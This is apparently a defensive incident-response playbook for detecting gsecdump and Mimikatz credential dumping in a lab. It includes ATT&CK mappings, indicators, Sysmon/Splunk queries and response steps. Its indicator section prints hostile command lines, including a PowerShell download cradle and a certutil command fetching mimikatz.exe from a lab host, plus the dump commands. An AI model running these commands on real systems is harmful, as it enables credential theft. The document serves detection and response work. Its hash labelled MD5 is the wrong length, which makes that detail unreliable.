# Overview

Playbook Name: Gsec Credential Dump (Full Credential Dump)


Tactic: Initial Access / Execution / Defense Evasion (depends on delivery method)
MITRE ATT&CK ID: T1105 – Ingress Tool Transfer

This covers the transfer or download of tools (like Mimikatz) to a compromised host.

- Example: downloading gsecdump via Invoke-WebRequest

Tactic: Credential Access
| Action                                                                            | ATT\&CK ID    | Technique / Sub-Technique                                                                                                       |
| --------------------------------------------------------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Dump **LSASS memory** (live creds, NTLM hashes)                                   | **T1003.001** | OS Credential Dumping: LSASS Memory                                                                                             |
| Dump **SAM database** (local accounts, hashes)                                    | **T1003.002** | OS Credential Dumping: Security Account Manager                                                                                 |
| Dump **LSA Secrets** (service account passwords, cached creds, DPAPI secrets)     | **T1003.004** | OS Credential Dumping: LSA Secrets                                                                                              |
| Dump **Cached domain logon credentials** (stored in registry, accessible offline) | **T1003.005** | OS Credential Dumping: Cached Domain Credentials                                                                                |
| Attempt to dump **Wireless keys** (if implemented in your version)                | **T1003.007** | OS Credential Dumping: Cached Domain Credentials (sometimes mapped to Wi-Fi creds, though not always clearly mapped in ATT\&CK) |


# Indicators of Compromise (IOCs)
1. File Hashes (Mimikatz)
   - MD5: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
   - Virus Total Score (malicious)
   - Screenshot: <img width="1908" height="1007" alt="image" src="https://github.com/user-attachments/assets/154e58e2-bffd-481e-bc63-3f60488df459" />


3. Filenames

- gsecdump.exe

- Dropped temp names like:


    - C:\Users\labadmin\mimikatz.exe

3. Process Indicators (Event ID 1 / 4688)

- Parent/Child chain:

    - cmd.exe → powershell.exe → mimikatz.exe

- Suspicious command-line usage:

    - `powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.105:8080/mimikatz.exe")"`

    - `certutil.exe -urlcache -split -f http://192.168.1.105:8080/mimikatz.exe mimikatz.exe`

4. Network Indicators (Event ID 3)

- Download server (lab/demo example):

    - 192.168.1.105:8080

Real-world examples:

pastebin[.]com/raw/<id> (common for PowerShell dropper hosting)

Dynamic DNS services: abc123.no-ip[.]org

5. Registry & Script Indicators

- PowerShell Event ID 4104:

    - System.Net.WebClient.DownloadFile

    - Invoke-WebRequest http://192.168.1.105:8080/mimikatz.exe

    - Base64-encoded payloads in PowerShell scriptblocks.

6. Process Access (Event ID 10)

- SourceImage:

    - C:\Users\labadmin\mimikatz.exe

- TargetImage:

    - C:\Windows\System32\lsass.exe

- GrantedAccess:

    0x1010, 0x1410 (typical for memory dump attempts).

# Detection

## Log Sources:

    Windows Event Logs (4688, 4104, 4103)
    Sysmon Event ID 1 Process Creation
    Sysmon Event ID 3 Network Connection
    Sysmon Event ID 11 File Creation
    Sysmon Event ID 10 ProcessAccess
    EDR/SIEM alerts


## Investigation Steps
- Find downloaded files (Sysmon Event ID 1)
- Find Created Files (Sysmon Event ID 11)
- Find Netowrk connections to external resources (Sysmon Event ID 3)
- Detect execution of downloaded file (Mimikatz.exe) (Sysmon Event ID 1)
- Detect Access to lsass from the malicious image (Sysmon Event ID 10)
- Check file reputation (Virustotal)

- Find Execution of gsecdump.exe
## Detection Query (Lab Demo):

### Detecting Process Creation (CMD to powershell) - Starting gsecdump.exe
`index="sysmon" EventID=1 CommandLine="*gsecdump.exe*" | table _time ParentCommandLine ParentImage, CommandLine, Image , User`

Screenshot: <img width="1057" height="784" alt="image" src="https://github.com/user-attachments/assets/39a7bbd4-ba0e-4fd1-923f-f03cadd1fef6" />

This will look for any command line arguments including gsecdump.exe, we can see CMD being spawned by powershell which is then used to run `gsecdump.exe -a` which attempts all credential dumping techniques. Finally we can confirm gsecdump.exe runs the necessary command.


### Detecting Process Acesss
The `sekurlsa::logonpasswords` command in mimikatz is ran to dump the contents of the LSASS Service. LSASS is responsible for enforcing the security policy on the sytem. It handles logins, grants access tokens and manages password changes. All of these operations lead to credentials being available in the process memory of lsass.exe, this can be accessed with admin privileges and the credentials can then be dumped

Query: `index=sysmon EventID=10 TargetImage="C:\\Windows\\system32\\lsass.exe" SourceImage="C:\\Users\\labadmin\\mimikatz.exe" |table SourceUser,Computer, GrantedAccess, SourceImage, TargetImage`
Screenshot: <img width="1019" height="766" alt="image" src="https://github.com/user-attachments/assets/00a856b4-2f14-43d5-a67e-91b66547a852" />

3. Investigation (Mapped to ATT&CK)

- Correlate parent-child process chains

- Look for abnormal spawns (winword.exe → powershell.exe, cmd.exe → certutil.exe).

    - MITRE:

        - T1059.001 – Command and Scripting Interpreter: PowerShell

        - T1218 – Signed Binary Proxy Execution (LOLBins like certutil.exe)

- Validate user context

- Identify if the process ran under a privileged account.

    - MITRE:

        - T1078 – Valid Accounts

        - T1078.002 – Domain Accounts

- Inspect command-line arguments

- Look for encoded or obfuscated PowerShell.

    - MITRE:

        - T1027 – Obfuscated Files or Information

        - T1059 – Command and Scripting Interpreter

- Check file and network artifacts

    - Event ID 11 (file creation of mimikatz.exe).

    - Event ID 3 (network connections for download).

    - MITRE:

        - T1105 – Ingress Tool Transfer

        - T1071.001 – Application Layer Protocol: Web Protocols

- Look for credential access attempts

    - Event ID 10 (ProcessAccess to lsass.exe).

    - MITRE:

        - T1003.001 – LSASS Memory

4. Containment (Mapped to ATT&CK)

- Process isolation (kill mimikatz.exe / PowerShell).

    - MITRE: N/A (defensive action).

- Host isolation (remove from network).

    - MITRE: N/A (defensive action).

- Account lockdown (disable/reset).

    - MITRE (attacker side): T1078 – Valid Accounts

    - Response: Stop adversary from leveraging stolen creds.

- Network controls (block IPs/domains).

    - MITRE (attacker side):

        - T1071 – Application Layer Protocol

        - T1090 – Proxy (if relays observed)

5. Eradication (Mapped to ATT&CK)

- Delete malicious binaries/scripts

- Remove mimikatz.exe and staged files.

    - MITRE:

        - T1105 – Ingress Tool Transfer

- Check persistence mechanisms (registry, scheduled tasks, services).

    - MITRE:

        - T1053 – Scheduled Task/Job

        - T1547 – Boot or Logon Autostart Execution

- Malware scanning

    - Detect secondary tools (Cobalt Strike, etc.).

    - MITRE:

        - T1055 – Process Injection (if beacon is injected)

        - T1105 – Additional payloads

- Privilege checks

    - Verify admin groups and local users.

    - MITRE:

        - T1098 – Account Manipulation

6. Recovery (Mapped to ATT&CK)

- Credential hygiene

    - Reset passwords, rotate Kerberos keys.

    - MITRE (attacker side):

    - T1558 – Steal or Forge Kerberos Tickets

    - T1552 – Unsecured Credentials

- System restoration

    - Restore clean images, patch systems.

    - MITRE: Prevents reinfection using known vulnerabilities (T1190 – Exploit Public-Facing Application).

- Monitoring
    
    - Ensure Sysmon + logging re-enabled.

    - MITRE:

        - T1562 – Impair Defenses

- Validation

    - Confirm no persistence remains.

    - MITRE:

        - T1547 – Persistence via Autostart

        - T1053 – Scheduled Tasks

7. Lessons Learned (Mapped to ATT&CK)

- Logging & Monitoring Improvements

    - Capture PowerShell Script Block, Sysmon IDs 1/3/10/11.

        - MITRE:

            - T1059.001 – PowerShell

            - T1003.001 – LSASS Memory

- Security Controls

    - AppLocker / WDAC to block unsigned tools.

    - Credential Guard to protect LSASS.

        - MITRE:

            - T1562 – Impair Defenses (mitigating attacker attempts to bypass).

- User & SOC Training

    - Spot phishing → Mimikatz delivery vector.

        - MITRE:

            - T1566 – Phishing

            - T1204 – User Execution

- Incident Simulation

    - Purple team exercises against credential dumping.

        - MITRE:

            - T1003 – Credential Dumping

            - T1555 – Credentials from Password Stores
